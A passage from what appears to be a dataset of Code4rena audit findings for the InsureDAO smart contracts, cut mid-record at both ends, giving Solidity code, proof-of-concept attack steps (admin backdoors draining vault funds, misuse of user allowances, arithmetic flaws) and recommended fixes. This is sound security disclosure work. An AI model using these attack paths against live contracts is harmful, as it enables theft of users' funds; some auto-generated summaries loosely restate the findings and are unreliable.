      "summary": "\nThis bug report is about a problem with the withdrawal process in the Insure contract. The contract has a lockup period between withdrawal requests and actual withdrawals, but there is no obligation for users to actually withdraw their funds after the lockup period. This allows underwriters to continuously request withdrawals every lockup period, keeping their average lockup time at half the set lockup period. This means they can continue to earn interest on their funds while only having to pay the extra gas cost for the withdrawal request. To fix this issue, it is recommended to either extend the lockup period or force underwriters to withdraw after the lockup period. The team has acknowledged the issue and plans to have a longer lockup period in the production version of the contract.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "InsureDAO",
      "source_link": "https://code4rena.com/reports/2022-01-insure",
      "github_link": "https://github.com/code-423n4/2022-01-insure-findings/issues/295",
      "tags": [],
      "finders": []
    },
    {
      "id": "42439",
      "title": "[M-05] `Vault.sol` Tokens with fee on transfer are not supported",
      "impact": "MEDIUM",
      "content": "_Submitted by WatchPug, also found by pmerkleplant, cmichel, Ruhum, and Dravee_\n\nThere are ERC20 tokens that charge fee for every `transfer()` / `transferFrom()`.\n\n`Vault.sol#addValue()` assumes that the received amount is the same as the transfer amount, and uses it to calculate attributions, balance amounts, etc. While the actual transferred amount can be lower for those tokens.\n\n<https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/Vault.sol#L124-L140>\n\n```solidity\nfunction addValue(\n    uint256 _amount,\n    address _from,\n    address _beneficiary\n) external override onlyMarket returns (uint256 _attributions) {\n\n    if (totalAttributions == 0) {\n        _attributions = _amount;\n    } else {\n        uint256 _pool = valueAll();\n        _attributions = (_amount * totalAttributions) / _pool;\n    }\n    IERC20(token).safeTransferFrom(_from, address(this), _amount);\n    balance += _amount;\n    totalAttributions += _attributions;\n    attributions[_beneficiary] += _attributions;\n}\n```\n\n#### Recommendation\n\nConsider comparing before and after balance to get the actual transferred amount.\n\n**[oishun1112 (Insure) acknowledged](https://github.com/code-423n4/2022-01-insure-findings/issues/236):**\n > only USDC can be underwriting asset. We are trying to make it multi currency. \n> We won't implement this now due to the gas consumption, but we will when we develop new type of Vault\n\n\n",
      "summary": "\nThe report discusses a bug found in a project's code by multiple users. The bug involves ERC20 tokens that charge a fee for every transfer. The code assumes that the received amount is the same as the transfer amount, but for these tokens, the actual transferred amount can be lower. This can cause issues with calculating attributions and balance amounts. The recommendation is to compare the before and after balance to get the actual transferred amount. The project has acknowledged the bug and plans to address it in the future.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "InsureDAO",
      "source_link": "https://code4rena.com/reports/2022-01-insure",
      "github_link": "https://github.com/code-423n4/2022-01-insure-findings/issues/236",
      "tags": [],
      "finders": []
    },
    {
      "id": "42438",
      "title": "[M-02] Owner can call `applyCover` multiple times in `PoolTemplate.sol`",
      "impact": "MEDIUM",
      "content": "_Submitted by camden_\n\nThe owner could potentially extend the insurance period indefinitely in the `applyCover` function without ever allowing the market to resume. This is because there is no check in `applyCover` to ensure that the market is in a `Trading` state.\n\nThis can also allow the owner to emit fraudulent `MarketStatusChanged` events.\n\n#### Recommended Mitigation Steps\n\nRequire that the market be in a `Trading` state to allow another `applyCover` call.\n\n**[oishun1112 (Insure) confirmed and resolved](https://github.com/code-423n4/2022-01-insure-findings/issues/160):**\n > this behaviour is not intended, so confirmed.\n\n**[0xean (judge) commented](https://github.com/code-423n4/2022-01-insure-findings/issues/160#issuecomment-1023710961):**\n > upgrading to medium severity since it alters the function of the protocol \n> \n> `\n> 2  Med: Assets not at direct risk, but the function of the protocol or its availability could be impacted, or leak value with a hypothetical attack path with stated assumptions, but external requirements.\n> `\n\n",
      "summary": "\nSummary:\n\nA bug was reported by a user named camden regarding the `applyCover` function in the Insure protocol. The bug allows the owner to extend the insurance period indefinitely without allowing the market to resume trading. It also allows the owner to emit fraudulent `MarketStatusChanged` events. The recommended mitigation steps include requiring the market to be in a `Trading` state before allowing another `applyCover` call. The bug has been confirmed and resolved by a user named oishun1112, and another user named 0xean has commented that it should be considered a medium severity bug as it could impact the function of the protocol.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "InsureDAO",
      "source_link": "https://code4rena.com/reports/2022-01-insure",
      "github_link": "https://github.com/code-423n4/2022-01-insure-findings/issues/160",
      "tags": [],
      "finders": []
    },
    {
      "id": "42437",
      "title": "[H-13] Admin of the index pool can `withdrawCredit()` after `applyCover()` to avoid taking loss for the compensation paid for a certain pool",
      "impact": "HIGH",
      "content": "_Submitted by WatchPug_\n\nIn the current implementation, when an incident is reported for a certain pool, the index pool can still `withdrawCredit()` from the pool, which in the best interest of an index pool, the admin of the index pool is preferred to do so.\n\nThis allows the index pool to escape from the responsibility for the risks of invested pools.\n\nMaking the LPs of the pool take an unfair share of the responsibility.\n\n##### Proof of Concept\n\n*   Pool A `totalCredit` = 10,000\n*   Pool A `rewardPerCredit` = 1\n\n1.  \\[Index Pool 1] allocates 1,000 credits to Pool `A`:\n\n*   `totalCredit` = 11,000\n*   indicies\\[Index Pool 1] = 1,000\n\n2.  After a while, Pool A `rewardPerCredit` has grown to `1.1`, and `applyCover()` has been called, \\[Index Pool 1] call `withdrawCredit()` get 100 premium\n\n*   `totalCredit` = 10,000\n*   indicies\\[Index Pool 1] = 0\n\n3.  After `pendingEnd`, the pool `resume()`,\\[ Index Pool 1] will not be paying for the compensation since `credit` is 0.\n\nIn our case, \\[Index Pool 1] earned premium without paying for a part of the compensation.\n\n#### Recommendation\n\nChange to:\n\n<https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/PoolTemplate.sol#L416-L421>\n\n```solidity\nfunction withdrawCredit(uint256 _credit)\n    external\n    override\n    returns (uint256 _pending)\n{\n    require(\n        marketStatus == MarketStatus.Trading,\n        \"ERROR: WITHDRAW_CREDIT_BAD_CONDITIONS\"\n    );\n    IndexInfo storage _index = indicies[msg.sender];\n```\n\n**[oishun1112 (Insure) confirmed and disagreed with severity](https://github.com/code-423n4/2022-01-insure-findings/issues/281):**\n > to call PoolTemplate: withdrawCredit(), someone has to call IndexTemplate: withdraw(), set(), and adjustAlloc().\n> \n> set() is onlyOwner, so we assume it's fine()\n> adjustAlloc() is public. this clean up and flatten the credit distribution.\n> withdraw() is public. this reduce totalCredit to distribute. when exceed upperSlack, call adjustAlloc().\n> \n > We should lock the credit control when pool is in payout status.\n> This implementation, still allows small amount of withdraw, for users who were requested Withdraw.\n\n**[oishun1112 (Insure) commented](https://github.com/code-423n4/2022-01-insure-findings/issues/281#issuecomment-1027721179):**\n > We have fixed with PVE02 (Peckshield audit) issue together.\n\n \n",
      "summary": "\nThe bug report discusses a problem with the current implementation of a system where an incident is reported for a certain pool. It is possible for the index pool to withdraw credit from the pool, which is not fair for the investors of the pool. This allows the index pool to avoid taking responsibility for any risks and puts an unfair burden on the investors. The report provides a proof of concept, recommendation, and comments from the developers. The issue has been fixed in collaboration with a third-party audit. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "InsureDAO",
      "source_link": "https://code4rena.com/reports/2022-01-insure",
      "github_link": "https://github.com/code-423n4/2022-01-insure-findings/issues/281",
      "tags": [],
      "finders": []
    },
    {
      "id": "42436",
      "title": "[H-12] `IndexTemplate.sol` Wrong implementation allows lp of the index pool to resume a locked `PayingOut` pool and escape the responsibility for the compensation",
      "impact": "HIGH",
      "content": "_Submitted by WatchPug, also found by leastwood_\n\nBased on the context, the system intends to lock all the lps during PayingOut period.\n\nHowever, the current implementation allows anyone, including LPs to call `resume()` and unlock the index pool.\n\nIt allows a malicious LP to escape the responsibility for the compensation, at the expense of other LPs paying more than expected.\n\n<https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/IndexTemplate.sol#L459-L471>\n\n```solidity\nfunction resume() external override {\n    uint256 _poolLength = poolList.length;\n\n    for (uint256 i = 0; i < _poolLength; i++) {\n        require(\n            IPoolTemplate(poolList[i]).paused() == false,\n            \"ERROR: POOL_IS_PAUSED\"\n        );\n    }\n\n    locked = false;\n    emit Resumed();\n}\n```\n\n#### Recommendation\n\nChange to:\n\n```solidity\nfunction resume() external override {\n   uint256 _poolLength = poolList.length;\n\n   for (uint256 i = 0; i < _poolLength; i++) {\n       require(\n           IPoolTemplate(poolList[i]).marketStatus() == MarketStatus.Trading,\n           \"ERROR: POOL_IS_PAYINGOUT\"\n       );\n   }\n\n   locked = false;\n   emit Resumed();\n}\n```\n\n**[oishun1112 (Insure) confirmed](https://github.com/code-423n4/2022-01-insure-findings/issues/278)**\n\n",
      "summary": "\nThe system in question aims to lock all the lps during a specific period called PayingOut. However, there is a bug that allows anyone, including LPs, to call `resume()` and unlock the index pool. This means that a malicious LP can avoid their responsibility for compensation, causing other LPs to pay more than expected. The recommended solution is to change the code so that it checks for a different status before unlocking the pool. This bug has been confirmed by a member of the Insure team.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "InsureDAO",
      "source_link": "https://code4rena.com/reports/2022-01-insure",
      "github_link": "https://github.com/code-423n4/2022-01-insure-findings/issues/278",
      "tags": [],
      "finders": []
    },
    {
      "id": "42435",
      "title": "[H-11] `PoolTemplate.sol#resume()` Wrong implementation of `resume()` will compensate overmuch redeem amount from index pools",
      "impact": "HIGH",
      "content": "_Submitted by WatchPug, also found by danb_\n\nWrong arithmetic.\n\n***\n\n<https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/PoolTemplate.sol#L700-L717>\n\n```solidity\nuint256 _deductionFromIndex = (_debt * _totalCredit * MAGIC_SCALE_1E6) /\n            totalLiquidity();\n    uint256 _actualDeduction;\n    for (uint256 i = 0; i < indexList.length; i++) {\n        address _index = indexList[i];\n        uint256 _credit = indicies[_index].credit;\n        if (_credit > 0) {\n            uint256 _shareOfIndex = (_credit * MAGIC_SCALE_1E6) /\n                _totalCredit;\n            uint256 _redeemAmount = _divCeil(\n                _deductionFromIndex,\n                _shareOfIndex\n            );\n            _actualDeduction += IIndexTemplate(_index).compensate(\n                _redeemAmount\n            );\n        }\n    }\n```\n\n#### Proof of Concept\n\n*   totalLiquidity = 200,000\\* 10\\*\\*18;\n\n*   totalCredit = 100,000 \\* 10\\*\\*18;\n\n*   debt = 10,000 \\* 10\\*\\*18;\n\n*   \\[Index Pool 1] Credit = 20,000 \\* 10\\*\\*18;\n\n*   \\[Index Pool 2] Credit = 30,000 \\* 10\\*\\*18;\n\n```\nuint256 _deductionFromIndex = (_debt * _totalCredit * MAGIC_SCALE_1E6) /\n            totalLiquidity();\n// _deductionFromIndex = 10,000 * 10**6 * 10**18;\n\n```\n\n\\[Index Pool 1]:\n```solidity\n\nuint256 _shareOfIndex = (_credit * MAGIC_SCALE_1E6) / _totalCredit;  \n//  _shareOfIndex = 200000\n\nuint256 _redeemAmount = _divCeil(\n    _deductionFromIndex,\n    _shareOfIndex\n);\n\n// _redeemAmount = 25,000 * 10**18;\n```\n\\[Index Pool 2]:\n```solidity\nuint256 _shareOfIndex = (_credit * MAGIC_SCALE_1E6) / _totalCredit;  \n//  _shareOfIndex = 300000\n\nuint256 _redeemAmount = _divCeil(\n    _deductionFromIndex,\n    _shareOfIndex\n);\n\n// _redeemAmount = 16666666666666666666667 (~ 16,666 * 10**18)\n```\nIn most cases, the transaction will revet on underflow at:\n```solidity\nuint256 _shortage = _deductionFromIndex /\n    MAGIC_SCALE_1E6 -\n    _actualDeduction;\n```\nIn some cases, specific pools will be liable for unfair compensation:\n\nIf the CSD is empty, `Index Pool 1` only have `6,000 * 10**18` and `Index Pool 2` only have `4,000 * 10**18`, the `_actualDeduction` will be `10,000 * 10**18`, `_deductionFromPool` will be `0`.\n\n`Index Pool 1` should only pay `1,000 * 10**18`, but actually paid `6,000 * 10**18`, the LPs of `Index Pool 1` now suffer funds loss.\n\n#### Recommendation\n\nChange to:\n\n```solidity\nuint256 _deductionFromIndex = (_debt * _totalCredit * MAGIC_SCALE_1E6) / totalLiquidity();\nuint256 _actualDeduction;\nfor (uint256 i = 0; i < indexList.length; i++) {\n    address _index = indexList[i];\n    uint256 _credit = indicies[_index].credit;\n    if (_credit > 0) {\n        uint256 _shareOfIndex = (_credit * MAGIC_SCALE_1E6) /\n            _totalCredit;\n        uint256 _redeemAmount = _divCeil(\n            _deductionFromIndex * _shareOfIndex,\n            MAGIC_SCALE_1E6 * MAGIC_SCALE_1E6\n        );\n        _actualDeduction += IIndexTemplate(_index).compensate(\n            _redeemAmount\n        );\n    }\n}\n```\n\n**[oishun1112 (Insure) confirmed and resolved](https://github.com/code-423n4/2022-01-insure-findings/issues/283)**\n\n\n",
      "summary": "\nThe bug report is about a wrong calculation in the code of a contract called PoolTemplate.sol. This code is used for a project called Insure and is available on GitHub. The bug was discovered by two users, WatchPug and danb. \n\nThe wrong calculation occurs in a part of the code that deals with arithmetic operations. This part of the code has a loop that goes through a list of addresses and performs calculations based on the values associated with those addresses. However, the calculations are not correct, which can lead to errors in the code. \n\nTo demonstrate the bug, the users provided a proof of concept with specific values for the variables used in the code. The values used in the proof of concept are not realistic and are only meant to show the bug. \n\nThe users also provided a recommendation to fix the bug. The recommendation involves changing a specific part of the code to ensure that the calculations are correct. \n\nAfter the bug report was submitted, the team behind Insure confirmed the bug and resolved it by following the recommendation provided by the users. This means that the bug is no longer present in the code and the project is now functioning as intended. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "InsureDAO",
      "source_link": "https://code4rena.com/reports/2022-01-insure",
      "github_link": "https://github.com/code-423n4/2022-01-insure-findings/issues/283",
      "tags": [],
      "finders": []
    },
    {
      "id": "42434",
      "title": "[H-09] `Vault#setController()` owner of the Vault contracts can drain funds from the Vault",
      "impact": "HIGH",
      "content": "_Submitted by WatchPug_\n\n<https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/Vault.sol#L485-L496>\n\n```solidity\nfunction setController(address _controller) public override onlyOwner {\n    require(_controller != address(0), \"ERROR_ZERO_ADDRESS\");\n\n    if (address(controller) != address(0)) {\n        controller.migrate(address(_controller));\n        controller = IController(_controller);\n    } else {\n        controller = IController(_controller);\n    }\n\n    emit ControllerSet(_controller);\n}\n```\n\nThe owner of the Vault contract can set an arbitrary address as the `controller`.\n\n<https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/Vault.sol#L342-L352>\n\n```solidity\nfunction utilize() external override returns (uint256 _amount) {\n    if (keeper != address(0)) {\n        require(msg.sender == keeper, \"ERROR_NOT_KEEPER\");\n    }\n    _amount = available(); //balance\n    if (_amount > 0) {\n        IERC20(token).safeTransfer(address(controller), _amount);\n        balance -= _amount;\n        controller.earn(address(token), _amount);\n    }\n}\n```\n\nA malicious `controller` contract can transfer funds from the Vault to the attacker.\n\n#### Proof of Concept\n\nA malicious/compromised can:\n\n1.  Call `Vault#setController()` and set `controller` to a malicious contract;\n    *   L489 the old controller will transfer funds to the new, malicious controller.\n2.  Call `Vault#utilize()` to deposit all the balance in the Vault contract into the malicious controller contract.\n3.  Withdraw all the funds from the malicious controller contract.\n\n#### Recommendation\n\nConsider disallowing `Vault#setController()` to set a new address if a controller is existing, which terminates the possibility of migrating funds to a specified address provided by the owner. Or, putting a timelock to this function at least.\n\n\n**[oishun1112 (Insure) acknowledged and disagreed with severity](https://github.com/code-423n4/2022-01-insure-findings/issues/271):**\n > we assume ownership control is driven safely\n\n**[0xean (judge) commented](https://github.com/code-423n4/2022-01-insure-findings/issues/271#issuecomment-1023326594):**\n > Agree with warden that the privilege addresses should not be able to use approvals in a way that rugs users funds.\n> \n> Based on the fact that we have seen many rug pulls in the space based on compromised \"owner\" keys, this is a valid attack path.\n> `\n> 3  High: Assets can be stolen/lost/compromised directly (or indirectly if there is a valid attack path that does not have hand-wavy hypotheticals).\n> `\n\n\n\n",
      "summary": "\nThis bug report is about a vulnerability found in the Vault contract of the Insure project. The owner of the contract has the ability to set an arbitrary address as the \"controller\", which can then be used to transfer funds from the Vault to the attacker. This can be done by calling the `setController()` function to set the controller to a malicious contract, and then using the `utilize()` function to deposit all the balance in the Vault to the malicious contract. The attacker can then withdraw the funds from the malicious contract. The report recommends disallowing the `setController()` function if a controller is already set, or implementing a timelock for this function. The severity of this vulnerability was disagreed upon by the Insure team, but the judge agreed that it is a valid attack path and could result in the loss of user funds.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "InsureDAO",
      "source_link": "https://code4rena.com/reports/2022-01-insure",
      "github_link": "https://github.com/code-423n4/2022-01-insure-findings/issues/271",
      "tags": [],
      "finders": []
    },
    {
      "id": "42433",
      "title": "[H-08] `IndexTemplate.sol#compensate()` will most certainly fail",
      "impact": "HIGH",
      "content": "_Submitted by WatchPug_\n\nPrecision loss while converting between `the amount of shares` and `the amount of underlying tokens` back and forth is not handled properly.\n\n***\n\n<https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/IndexTemplate.sol#L438-L447>\n\n```solidity\nuint256 _shortage;\nif (totalLiquidity() < _amount) {\n    //Insolvency case\n    _shortage = _amount - _value;\n    uint256 _cds = ICDSTemplate(registry.getCDS(address(this)))\n        .compensate(_shortage);\n    _compensated = _value + _cds;\n}\nvault.offsetDebt(_compensated, msg.sender);\n```\n\nIn the current implementation, when someone tries to resume the market after a pending period ends by calling `PoolTemplate.sol#resume()`, `IndexTemplate.sol#compensate()` will be called internally to make a payout. If the index pool is unable to cover the compensation, the CDS pool will then be used to cover the shortage.\n\nHowever, while `CDSTemplate.sol#compensate()` takes a parameter for the amount of underlying tokens, it uses `vault.transferValue()` to transfer corresponding `_attributions` (shares) instead of underlying tokens.\n\nDue to precision loss, the `_attributions` transferred in the terms of underlying tokens will most certainly be less than the shortage.\n\nAt L444, the contract believes that it's been compensated for `_value + _cds`, which is lower than the actual value, due to precision loss.\n\nAt L446, when it calls `vault.offsetDebt(_compensated, msg.sender)`, the tx will revert at `require(underlyingValue(msg.sender) >= _amount)`.\n\nAs a result, `resume()` can not be done, and the debt can't be repaid.\n\n##### Proof of Concept\n\nGiven:\n\n*   vault.underlyingValue = 10,000\n*   vault.valueAll = 30,000\n*   totalAttributions = 2,000,000\n*   \\_amount = 1,010,000\n\n0.  \\_shortage = \\_amount - vault.underlyingValue = 1,000,000\n1.  \\_attributions = (\\_amount \\* totalAttributions) / valueAll = 67,333,333\n2.  actualValueTransfered = (valueAll \\* \\_attributions) / totalAttributions = 1009999\n\n**Expected results**: actualValueTransfered = \\_shortage;\n\n**Actual results**: actualValueTransfered < \\_shortage.\n\n#### Impact\n\nThe precision loss isn't just happening on special numbers, but will most certainly always revert the txs.\n\nThis will malfunction the contract as the index pool can not `compensate()`, therefore the pool can not `resume()`. Causing the funds of the LPs of the pool and the index pool to be frozen, and other stakeholders of the same vault will suffer fund loss from an unfair share of the funds compensated before.\n\n#### Recommendation\n\nChange to:\n\n<https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/IndexTemplate.sol#L439-L446>\n\n```solidity\nif (totalLiquidity() < _amount) {\n    //Insolvency case\n    _shortage = _amount - _value;\n    uint256 _cds = ICDSTemplate(registry.getCDS(address(this)))\n        .compensate(_shortage);\n    _compensated = vault.underlyingValue(address(this));\n}\nvault.offsetDebt(_compensated, msg.sender);\n```\n\n**[oishun1112 (Insure) confirmed and disagreed with severity](https://github.com/code-423n4/2022-01-insure-findings/issues/269)** \n\n**[oishun1112 (Insure) resolved](https://github.com/code-423n4/2022-01-insure-findings/issues/269)**\n\n\n",
      "summary": "\nThe bug report discusses a problem with the conversion between the amount of shares and the amount of underlying tokens in the code for the Insure project. This issue causes a loss of precision, resulting in incorrect calculations and transactions being reverted. The report includes a proof of concept and outlines the impact of the bug, which can cause funds to be frozen and result in unfair distribution of compensation. The recommendation is to make a change to the code to resolve the issue. The bug has been confirmed and resolved by the project team.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "InsureDAO",
      "source_link": "https://code4rena.com/reports/2022-01-insure",
      "github_link": "https://github.com/code-423n4/2022-01-insure-findings/issues/269",
      "tags": [],
      "finders": []
    },
    {
      "id": "42432",
      "title": "[H-07] Wrong design/implementation of permission control allows malicious/compromised Registry or Factory admin to steal funds from users' wallet balances",
      "impact": "HIGH",
      "content": "_Submitted by WatchPug_\n\nThe current design/implementation allows a `market` address (registered on `registry`) to call `Vault#addValue()` and transfer tokens from an arbitrary address to a specified `_beneficiary` up the approved amount at any time, and the `_beneficiary` can withdraw the funds by calling `Vault#withdrawAllAttribution()` immediately.\n\nThis poses a very dangerous risk to all the users that approved their tokens to the Vault contracts (each one holds all users' allowances for that token).\n\n<https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/Vault.sol#L52-L58>\n\n```solidity\nmodifier onlyMarket() {\n    require(\n        IRegistry(registry).isListed(msg.sender),\n        \"ERROR_ONLY_MARKET\"\n    );\n    _;\n}\n```\n\n<https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/Vault.sol#L124-L140>\n\n```solidity\nfunction addValue(\n    uint256 _amount,\n    address _from,\n    address _beneficiary\n) external override onlyMarket returns (uint256 _attributions) {\n\n    if (totalAttributions == 0) {\n        _attributions = _amount;\n    } else {\n        uint256 _pool = valueAll();\n        _attributions = (_amount * totalAttributions) / _pool;\n    }\n    IERC20(token).safeTransferFrom(_from, address(this), _amount);\n    balance += _amount;\n    totalAttributions += _attributions;\n    attributions[_beneficiary] += _attributions;\n}\n```\n\nRegistry owner can call `Registry#supportMarket()` and mark an arbitrary address as a `market`.\n\n<https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/Registry.sol#L49-L60>\n\n```solidity\nfunction supportMarket(address _market) external override {\n    require(!markets[_market], \"ERROR: ALREADY_REGISTERED\");\n    require(\n        msg.sender == factory || msg.sender == ownership.owner(),\n        \"ERROR: UNAUTHORIZED_CALLER\"\n    );\n    require(_market != address(0), \"ERROR: ZERO_ADDRESS\");\n\n    allMarkets.push(_market);\n    markets[_market] = true;\n    emit NewMarketRegistered(_market);\n}\n```\n\nOr, the owner of the Factory can call `createMarket()` to add a malicous market contract via a custom template contract to the `markets` list.\n\n<https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/Factory.sol#L214-L216>\n\n#### Proof of Concept\n\nA malicious/compromised Registry owner can:\n\n1.  Call `Registry#supportMarket()` and set `markets[attackerAddress]` to `true`;\n2.  Call `Vault#addValue(token.balanceOf(victimAddress), victimAddress, attackerAddress)` and transferring all the balanceOf victim's wallet to the vault, owned by `attackerAddress`.\n3.  Call `Vault#withdrawAllAttribution(attackerAddress)` and retrive the funds.\n\nThe malicious/compromised Registry owner can repeat the steps above for all the users who approved the Vault contract for all the Vault contracts.\n\nAs a result, the attacker can steal all the wallet balances of the tokens approved to the protocol.\n\n#### Root Cause\n\nImproper access control for using users' allowances.\n\n#### Recommendation\n\nConsider changing the design/implementation to make sure that the allowances approved by the users can only be used by themselves.\n\n\n**[oishun1112 (Insure) acknowledged and disagreed with severity](https://github.com/code-423n4/2022-01-insure-findings/issues/266):**\n > this is an issue only when ownership control has fail. This architecture is necessary to achieve simplicity of the code.\n> We assume ownership control works fine.\n\n**[0xean (judge) commented](https://github.com/code-423n4/2022-01-insure-findings/issues/266#issuecomment-1023323992):**\n > Agree with warden that the privilege addresses should not be able to use approvals in a way that rugs users funds. \n> \n> Based on the fact that we have seen many rug pulls in the space based on compromised \"owner\" keys, this is a valid attack path. \n> \n> `\n> 3  High: Assets can be stolen/lost/compromised directly (or indirectly if there is a valid attack path that does not have hand-wavy hypotheticals).\n> `\n\n\n\n",
      "summary": "\nThe current design of the code allows a `market` address to transfer tokens from any address to a specified `_beneficiary` without their permission. This poses a risk to all users that have approved their tokens to the Vault contracts. The Registry owner or Factory owner can add a malicious market contract to the list and steal funds from users who have approved the Vault contract. This is due to improper access control for using user allowances. It is recommended to change the design to only allow users to use their own allowances. The severity of this issue is being disputed by the Insure team, but the judges agree that this is a valid attack path and could result in stolen funds.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "InsureDAO",
      "source_link": "https://code4rena.com/reports/2022-01-insure",
      "github_link": "https://github.com/code-423n4/2022-01-insure-findings/issues/266",
      "tags": [],
      "finders": []
    },
    {
      "id": "42431",
      "title": "[H-05] backdoor in `withdrawRedundant`",
      "impact": "HIGH",
      "content": "_Submitted by cmichel, also found by camden, WatchPug, and Ruhum_\n\nThe `Vault.withdrawRedundant` has wrong logic that allows the admins to steal the underlying vault token.\n\n```solidity\nfunction withdrawRedundant(address _token, address _to)\n     external\n     override\n     onlyOwner\n{\n     if (\n          _token == address(token) &&\n          balance < IERC20(token).balanceOf(address(this))\n     ) {\n          uint256 _redundant = IERC20(token).balanceOf(address(this)) -\n               balance;\n          IERC20(token).safeTransfer(_to, _redundant);\n     } else if (IERC20(_token).balanceOf(address(this)) > 0) {\n          // @audit they can rug users. let's say balance == IERC20(token).balanceOf(address(this)) => first if false => transfers out everything\n          IERC20(_token).safeTransfer(\n               _to,\n               IERC20(_token).balanceOf(address(this))\n          );\n     }\n}\n```\n\n###### POC\n\n*   Vault deposits increase as `Vault.addValue` is called and the `balance` increases by `_amount` as well as the actual `IERC20(token).balanceOf(this)`. Note that `balance == IERC20(token).balanceOf(this)`\n*   Admins call `vault.withdrawRedundant(vault.token(), attacker)` which goes into the `else if` branch due to the balance inequality condition being `false`. It will transfer out all `vault.token()` amounts to the attacker.\n\n#### Impact\n\nThere's a backdoor in the `withdrawRedundant` that allows admins to steal all user deposits.\n\n#### Recommended Mitigation Steps\n\nI think the devs wanted this logic from the code instead:\n\n```solidity\nfunction withdrawRedundant(address _token, address _to)\n     external\n     override\n     onlyOwner\n{\n     if (\n          _token == address(token)\n     ) {\n          if (balance < IERC20(token).balanceOf(address(this))) {\n               uint256 _redundant = IERC20(token).balanceOf(address(this)) -\n                    balance;\n               IERC20(token).safeTransfer(_to, _redundant);\n          }\n     } else if (IERC20(_token).balanceOf(address(this)) > 0) {\n          IERC20(_token).safeTransfer(\n               _to,\n               IERC20(_token).balanceOf(address(this))\n          );\n     }\n}\n```\n\n**[oishun1112 (Insure) confirmed](https://github.com/code-423n4/2022-01-insure-findings/issues/252):**\n > similar to PVE03 (Peckshield audit)\n > We will create a PR and merge after we merge both audit/code4rena and audit/peckshield branches in the InsureDAO repository.\n\n\n",
      "summary": "\nThe bug report is about a coding error in the `Vault.withdrawRedundant` function that allows the admins to steal the underlying vault token. This bug was found by multiple users and can be exploited by depositing funds into the vault and then calling the `withdrawRedundant` function with the attacker's address. This can result in the admins being able to steal all user deposits. The recommended mitigation steps involve changing the logic of the function to prevent this backdoor from being exploited. This bug has been confirmed by the Insure team and they will be making the necessary changes to fix it.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "InsureDAO",
      "source_link": "https://code4rena.com/reports/2022-01-insure",
      "github_link": "https://github.com/code-423n4/2022-01-insure-findings/issues/252",
      "tags": [],
      "finders": []
    },
    {
      "id": "1314",
      "title": "[M-08] Unbounded iteration over all indexes (2)",
      "impact": "MEDIUM",
      "content": "_Submitted by Dravee, also found by robee, egjlmn1, danb, WatchPug, Fitraldys, and Ruhum_\n\nThe transactions could fail if the array get too big and the transaction would consume more gas than the block limit.\nThis will then result in a denial of service for the desired functionality and break core functionality.\n\n#### Proof of Concept\n\n<https://github.com/code-423n4/2022-01-insure/blob/main/contracts/PoolTemplate.sol#L703>\n\n#### Tools Used\n\nVS Code\n\n#### Recommended Mitigation Steps\n\nKeep the array size small.\n\n**[oishun1112 (Insure) confirmed](https://github.com/code-423n4/2022-01-insure-findings/issues/352)**\n\n**[0xean (judge) commented](https://github.com/code-423n4/2022-01-insure-findings/issues/352#issuecomment-1023645387):**\n > Upgrading to sev-2 as this will eventually affect the availability of the protocol as transactions revert. \n\n\n",
      "summary": "\nThis bug report is about a vulnerability in the code of a contract called PoolTemplate.sol. The vulnerability could cause transactions to fail if the array size gets too big, which would result in a denial of service for the desired functionality and break core functionality. The proof of concept for this bug can be found at https://github.com/code-423n4/2022-01-insure/blob/main/contracts/PoolTemplate.sol#L703. The tool used to identify this vulnerability was VS Code. The recommended mitigation step for this vulnerability is to keep the array size small.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "InsureDAO",
      "source_link": "https://code4rena.com/reports/2022-01-insure",
      "github_link": "https://github.com/code-423n4/2022-01-insure-findings/issues/352",
      "tags": [],
      "finders": [
        "danb",
        "robee",
        "Dravee",
        "Ruhum",
        "WatchPug",
        "Fitraldys",
        "egjlmn1"
      ]
    },
    {
      "id": "1313",
      "title": "[M-07] requestWithdraw without obligation to withdraw allow underwriter to avoid payout",
      "impact": "MEDIUM",
